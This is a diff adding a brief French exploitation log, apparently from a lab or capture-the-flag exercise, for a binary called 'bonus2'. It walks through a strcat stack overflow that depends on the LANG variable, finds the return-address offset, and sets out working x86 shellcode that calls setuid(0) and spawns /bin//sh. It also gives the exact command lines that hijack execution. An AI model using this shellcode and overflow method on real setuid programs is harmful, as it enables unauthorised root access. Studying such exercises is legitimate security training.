@@ -1,0 +1,25 @@
+Ici on exploit overflow sur strcat !
+On peut voir que l'exe utilises la Variable LANG de l'env aussi.
+
+
+./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+
+segfault sur 0x08006262 -> l'eip n'est pas reecris completement, peu import la taille
+
+On peut voir des memcmp -> 0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
+
+Ca compare la variable LANG de l'env avec 'fi' || 'nl' -> on essaye de changer pour voir
+
+export LANG=fi
+
+./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+
+segfault sur 0x62626262 -> l'eip est reecrite !
+
+offset == 18
+
+export SHELLCODE=`python -c 'print "\x90" * 600 + "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"'`
+
+x/50s *((char **)environ) -> shellcode address -> 0xbffff738
+
+./bonus2 `python -c 'print "A" * 40'` `python -c 'print "B"*18 + "\x38\xf7\xff\xbf"'`
